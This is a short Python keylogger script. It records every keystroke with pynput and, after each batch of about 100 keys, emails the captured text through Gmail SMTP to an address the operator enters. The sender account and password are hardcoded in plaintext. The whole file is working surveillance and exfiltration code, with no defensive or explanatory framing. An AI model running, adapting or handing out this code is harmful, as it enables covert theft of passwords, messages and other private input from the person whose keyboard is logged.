import pynput
from pynput.keyboard import Key, Listener
import smtplib, ssl

receiver_email = input("Enter the email where you want to receive the logs: ")
print("The email you selected is: ", receiver_email)

print("<------------------------------------------------------->")

print("Keylogger running")


count = 0
keys = []


def sendEmail(message):
    global receiver_email
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "t3st.t3st.6783@gmail.com"
    password = "random@1234"
    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

    except Exception as e:
        print(e)
    finally:
        server.quit()

def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 100:
        count = 0
        email(keys)
        keys = []

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        elif key.find("Key")>0:
            k = ""
        message += k
    sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
